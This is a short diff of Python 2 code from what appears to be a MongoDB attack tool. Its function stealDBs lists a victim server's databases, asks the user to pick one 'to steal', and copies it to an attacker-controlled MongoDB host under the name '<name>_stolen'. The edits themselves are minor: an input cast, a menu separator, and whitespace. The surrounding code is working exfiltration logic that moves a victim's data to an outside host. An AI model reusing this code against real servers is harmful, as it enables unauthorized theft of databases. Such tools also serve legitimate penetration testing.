@@ -67,10 +67,10 @@ def stealDBs(myDBIP,victim,mongoConn):
         print "Can't get a list of databases to steal.  The provided credentials may not have rights."
         return
     for dbname in dbList:
-        print str(menuItem) + "-" + dbname
+        print str(menuItem) + "_" + dbname
         menuItem += 1
     while dbLoot:
-        dbLoot = raw_input("Select a database to steal:")
+        dbLoot = int(raw_input("Select a database to steal:"))
         if int(dbLoot) >= menuItem:
             print "Invalid selection."
         else:
@@ -79,7 +79,6 @@ def stealDBs(myDBIP,victim,mongoConn):
         dbNeedCreds = raw_input("Does this Database require credentials.(y/n)?")
         myDBConn = pymongo.MongoClient(myDBIP, 27017)
         if dbNeedCreds in no_tag:
-
             myDBConn.copy_database(dbList[dbLoot-1],dbList[dbLoot-1] + "_stolen",victim)
         elif dbNeedCreds in yes_tag:
             dbUser = raw_input("Enter database username:")
